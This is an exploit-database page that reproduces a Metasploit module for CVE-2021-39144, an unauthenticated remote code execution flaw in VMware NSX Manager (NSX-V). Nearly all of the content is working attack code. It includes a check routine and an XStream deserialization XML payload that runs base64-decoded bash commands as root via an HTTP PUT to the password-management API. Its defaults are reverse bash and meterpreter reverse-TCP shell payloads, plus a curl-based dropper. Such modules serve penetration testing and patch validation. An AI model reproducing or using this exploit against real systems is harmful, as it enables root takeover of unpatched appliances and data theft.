---
title: VMware NSX Manager XStream Unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022110020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-16
fetch_date: 2025-10-03T22:50:52.541879
---

# VMware NSX Manager XStream Unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **VMware NSX Manager XStream Unauthenticated Remote Code Execution** **2022.11.15**  Credit:  **[mr\_me](https://cxsecurity.com/author/mr_me/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'VMware NSX Manager XStream unauthenticated RCE',
'Description' => %q{
VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability via XStream open source library.
VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.
Due to an unauthenticated endpoint that leverages XStream for input serialization in VMware Cloud Foundation (NSX-V),
a malicious actor can get remote code execution in the context of 'root' on the appliance.
VMware Cloud Foundation 3.x and more specific NSX Manager Data Center for vSphere up to and including version 6.4.13
are vulnerable to Remote Command Injection.
This module exploits the vulnerability to upload and execute payloads gaining root privileges.
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die-gr3y', # metasploit module author
'Sina Kheirkhah', # Security researcher (Source Incite)
'Steven Seeley' # Security researcher (Source Incite)
],
'References' => [
['CVE', '2021-39144'],
['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0027.html'],
['URL', 'https://kb.vmware.com/s/article/89809'],
['URL', 'https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html'],
['URL', 'https://attackerkb.com/topics/ngprN6bu76/cve-2021-39144']
],
'DisclosureDate' => '2022-10-25',
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD, ARCH\_X86, ARCH\_X64],
'Privileged' => true,
'Targets' => [
[
'Unix (In-Memory)',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :in\_memory,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_bash'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X64],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => [ 'curl', 'printf' ],
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp'
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
end
def check\_nsx\_v\_mgr
return send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'login.jsp')
})
rescue StandardError => e
elog("#{peer} - Communication error occurred: #{e.message}", error: e)
fail\_with(Failure::Unknown, "Communication error occurred: #{e.message}")
end
def execute\_command(cmd, \_opts = {})
b64 = Rex::Text.encode\_base64(cmd)
random\_uri = rand\_text\_alphanumeric(4..10)
xml\_payload = <<~XML
<sorted-set>
<string>foo</string>
<dynamic-proxy>
<interface>java.lang.Comparable</interface>
<handler class="java.beans.EventHandler">
<target class="java.lang.ProcessBuilder">
<command>
<string>bash</string>
<string>-c</string>
<string>echo #{b64} &#x7c; base64 -d &#x7c; bash</string>
</command>
</target>
<action>start</action>
</handler>
</dynamic-proxy>
</sorted-set>
XML
return send\_request\_cgi({
'method' => 'PUT',
'ctype' => 'application/xml',
'uri' => normalize\_uri(target\_uri.path, 'api', '2.0', 'services', 'usermgmt', 'password', random\_uri),
'data' => xml\_payload
})
rescue StandardError => e
elog("#{peer} - Communication error occurred: #{e.message}", error: e)
fail\_with(Failure::Unknown, "Communication error occurred: #{e.message}")
end
# Checking if the target is potential vulnerable checking the http title "VMware Appliance Management"
# that indicates the target is running VMware NSX Manager (NSX-V)
# All NSX Manager (NSX-V) unpatched versions, except for 6.4.14, are vulnerable
def check
print\_status("Checking if #{peer} can be exploited.")
res = check\_nsx\_v\_mgr
return CheckCode::Unknown('No response received from the target!') unless res
html = res.get\_html\_document
html\_title = html.at('title')
if html\_title.nil? || html\_title.text != 'VMware Appliance Management'
return CheckCode::Safe('Target is not running VMware NSX Manager (NSX-V).')
end
CheckCode::Appears('Target is running VMware NSX Manager (NSX-V).')
end
def exploit
case target['Type']
when :in\_memory
print\_status("Executing #{target.name} with #{payload.encoded}")
execute\_command(payload.encoded)
when :linux\_dropper
print\_status("Executing #{target.name}")
execute\_cmdstager
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110020)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top